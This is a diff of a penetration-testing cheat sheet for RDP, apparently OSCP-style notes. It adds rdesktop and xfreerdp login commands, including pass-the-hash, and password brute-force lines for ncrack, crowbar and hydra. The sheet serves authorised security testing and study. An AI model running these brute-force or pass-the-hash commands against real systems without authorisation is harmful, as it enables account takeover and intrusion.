@@ -1,8 +1,25 @@
-# Login to RDP
-rdesktop -u guest -p guest INSERTIPADDRESS -g 94%
+# Pentest RDP
+# Default Port: 3389
 
-# Brute force
+
+# Login to RDP
+rdesktop -u guest -p guest INSERTIPADDRESS -g 94% +clipboard
+rdesktop -u <USERNAME> <IP>
+rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> <IP>
+xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP>
+xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:<IP>
+remmina (GUI)
+
+
+# Bruteforce (ncrack)
 ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS
+
+# Bruteforce (crowbar)
+crowbar -b rdp -s <IP>/CIDR -u <USER> -C <PASSWORDS_LIST>
+crowbar -b rdp -s <IP>/CIDR -U <USERS_LIST> -C <PASSWORDS_LIST>
+
+# Bruteforce (hydra)
+hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV -o report-rdp-hydra.txt
 
 
 # Metasploit Modules
